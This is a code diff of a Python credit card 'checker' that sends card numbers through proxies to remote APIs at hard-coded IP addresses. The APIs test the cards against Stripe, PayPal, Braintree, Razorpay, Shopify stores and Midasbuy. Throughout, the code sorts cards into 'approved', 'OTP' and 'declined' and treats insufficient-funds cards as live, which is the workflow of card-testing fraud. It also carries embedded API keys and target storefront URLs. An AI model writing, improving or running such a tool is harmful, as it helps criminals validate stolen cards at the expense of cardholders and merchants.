@@ -21,9 +21,9 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # ============================================================================
 # API ENDPOINTS
 # ============================================================================
-SHOPIFY_API_ENDPOINT = "http://181.214.147.157:5000/shopify"   # Shopify checker
-CARD_API_BASE        = "http://2.25.156.218:5001"          # Stripe, PayPal, VBV, Braintree
-RAZORPAY_API_URL     = "http://2.25.156.218:5000/check"    # Razorpay
+SHOPIFY_API_ENDPOINT = "http://181.214.147.157:5000/shopify"  # your local API
+CARD_API_BASE        = "http://2.25.156.218:5001"
+RAZORPAY_API_URL     = "http://2.25.156.218:5000/check"
 RAZORPAY_API_KEY     = "Novaop"
 
 # ============================================================================
@@ -67,7 +67,6 @@ def with_retries(max_attempts=3):
 # PROXY NORMALISATION
 # ============================================================================
 def normalise_proxy(proxy):
-    """Convert proxy string to http:// format for requests."""
     if not proxy:
         return None
     if proxy.startswith('http://') or proxy.startswith('https://'):
@@ -78,7 +77,6 @@ def normalise_proxy(proxy):
 # CORE API CALLER (for Stripe, PayPal, VBV, Braintree)
 # ============================================================================
 def _call_self_api(endpoint, cc, proxy=None):
-    """Generic caller for the self‑hosted API (port 5001)."""
     params = {'cc': cc}
     if proxy:
         params['proxy'] = proxy
@@ -106,7 +104,6 @@ def _call_self_api(endpoint, cc, proxy=None):
 # STRIPE AUTH (B3)
 # ============================================================================
 def check_stripe_auth(cc, proxy=None):
-    """Stripe Auth (0$ check) via /stripe_auth endpoint."""
     url = f"{CARD_API_BASE}/stripe_auth"
     headers = {"X-API-Key": "novaop"}
     params = {'cc': cc}
@@ -241,80 +238,43 @@ def check_braintree_b3(cc, proxy=None):
         return f"Braintree error: {str(e)[:80]}", "ERROR"
 
 # ============================================================================
-# SHOPIFY API – UPDATED WITH RAW STATUS & SMART CLASSIFICATION
+# SHOPIFY API – TRUST API STATUS
 # ============================================================================
 def check_shopify_api(site_url, cc, proxy=None):
-    """
-    Calls the Shopify checker API and returns a dict with:
-      - Response: the error message (if any) or the status string
-      - status:   'APPROVED', 'DECLINED', 'ERROR', 'APPROVED_OTP'
-      - gateway, price, site
-      - raw_response: the raw message from the API for better classification
-    """
     params = {'site': site_url, 'cc': cc}
     if proxy:
         params['proxy'] = proxy
+
     try:
         resp = requests.get(SHOPIFY_API_ENDPOINT, params=params, timeout=120, verify=False)
         resp.raise_for_status()
         data = resp.json()
 
-        raw_status = data.get('status', 'Unknown')
-        error_msg = data.get('error', '')
+        api_response = data.get('Response', 'Unknown')
+        api_status = data.get('status', 'Unknown')
         gateway = data.get('gateway', 'Shopify Payments')
-        price = str(data.get('amount', '0.00'))
-        api_success = data.get('success', False)
+        price = str(data.get('price', '0.00'))
 
-        # Build the response message
-        if error_msg:
-            response_msg = error_msg
+        # Map API status to our statuses
+        if api_status.upper() in ['APPROVED', 'APPROVED_OTP']:
+            our_status = api_status.upper()
+        elif api_status.upper() == 'DECLINED':
+            our_status = 'DECLINED'
+        elif api_status.upper() == 'CAPTCHA':
+            # CAPTCHA is a technical error
+            our_status = 'ERROR'
         else:
-            response_msg = raw_status
-
-        # ---- Determine status ----
-        # Start with ERROR and then upgrade to DECLINED/APPROVED/APPROVED_OTP
-        final_status = 'ERROR'
-
-        # If the API says success, it's at least an approval
-        if api_success:
-            if 'ORDER_PLACED' in raw_status.upper() or 'CHARGED' in raw_status.upper():
-                final_status = 'APPROVED'
-            elif '3DS' in raw_status.upper() or 'OTP' in raw_status.upper() or 'AUTHENTICATION' in raw_status.upper():
-                final_status = 'APPROVED_OTP'
-            elif 'INSUFFICIENT' in raw_status.upper():
-                final_status = 'APPROVED'   # low funds still a live card
-            else:
-                final_status = 'APPROVED'   # fallback for success
-        else:
-            # Not success – check if it's a clear decline
-            decline_keywords = [
-                'DECLINED', 'CARD_DECLINED', 'INSTRUMENT_DECLINED',
-                'DO_NOT_HONOR', 'CALL_ISSUER', 'PICK_UP_CARD',
-                'INCORRECT_NUMBER', 'INCORRECT_CVC', 'INCORRECT_ZIP',
-                'INCORRECT_ADDRESS', 'INCORRECT_PIN',
-                'INVALID_AMOUNT', 'INVALID_CURRENCY',
-                'FRAUD_SUSPECTED', 'HIGH_RISK_FRAUD_SUSPECTED',
-                'CARD_TESTING', 'AUTHENTICATION_FAILED',
-                'EXPIRED_CARD', 'EXPIRED_SESSION',
-                'INSUFFICIENT_FUNDS'  # this is a decline but we keep it as decline (not error)
-            ]
-            msg_upper = raw_status.upper()
-            if any(kw in msg_upper for kw in decline_keywords):
-                final_status = 'DECLINED'
-            elif '3DS' in msg_upper or 'OTP' in msg_upper or 'AUTHENTICATION' in msg_upper:
-                final_status = 'APPROVED_OTP'
-            else:
-                # Keep as ERROR for everything else (proxy issues, CAPTCHA, site errors)
-                final_status = 'ERROR'
+            our_status = 'ERROR'  # fallback
 
         return {
-            'Response': response_msg,
-            'status': final_status,
+            'Response': api_response,
+            'status': our_status,
             'gateway': gateway,
             'price': price,
             'site': site_url,
-            'raw_response': response_msg
+            'raw_response': data
         }
+
     except Exception as e:
         return {
             'Response': f'API Error: {str(e)[:80]}',
@@ -326,27 +286,11 @@ def check_shopify_api(site_url, cc, proxy=None):
         }
 
 def process_shopify_api_response(api_response, site_price='0.00'):
-    """
-    Extract (message, status, gateway) from the Shopify API response.
-    Preserves the status from the API (DECLINED/ERROR/APPROVED).
-    """
     if not api_response or not isinstance(api_response, dict):
         return "System Error", "ERROR", "Shopify Payments"
-
     msg = api_response.get('Response', 'Unknown')
     status = api_response.get('status', 'ERROR')
     gateway = api_response.get('gateway', 'Shopify Payments')
-
-    # Additional safety: if status is ERROR but the raw response contains a decline, override
-    if status == 'ERROR':
-        raw = api_response.get('raw_response', msg).upper()
-        decline_keywords = [
-            'DECLINED', 'CARD_DECLINED', 'INSUFFICIENT_FUNDS',
-            'DO_NOT_HONOR', 'INCORRECT_CVC', 'INCORRECT_ZIP'
-        ]
-        if any(kw in raw for kw in decline_keywords):
-            status = 'DECLINED'
-
     return msg, status, gateway
 
 # ============================================================================
@@ -494,7 +438,7 @@ def check_midasbuy(cc, proxy=None):
         return f"Midasbuy Error: {str(e)[:60]}", "ERROR"
 
 # ============================================================================
-# ALIASES (for compatibility)
+# ALIASES
 # ============================================================================
 check_stripe_api = check_stripe_charge
 check_b3_auth    = check_stripe_auth
@@ -506,7 +450,6 @@ check_midas      = check_midasbuy
 check_rz         = check_razorpay
 check_stripe5    = check_stripe_charge
 
-# Fallback gates (Shopify)
 def shopify_check(cc, proxy=None):
     FALLBACK_SITES = [
         "https://bb73c3-5.myshopify.com",
